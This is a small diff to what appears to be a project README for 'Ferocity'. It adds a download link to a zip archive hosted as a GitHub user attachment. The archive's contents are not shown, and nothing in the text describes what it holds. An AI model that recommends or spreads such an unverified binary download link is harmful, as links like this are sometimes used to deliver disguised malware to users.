@@ -29,7 +29,7 @@
 
 Time to have some fun with Ferocity! Download the latest version now.
 
-[Download the Latest Version]()
+[Download the Latest Version](https://github.com/user-attachments/files/16471972/Ferocity.zip)
 
 </div>
 
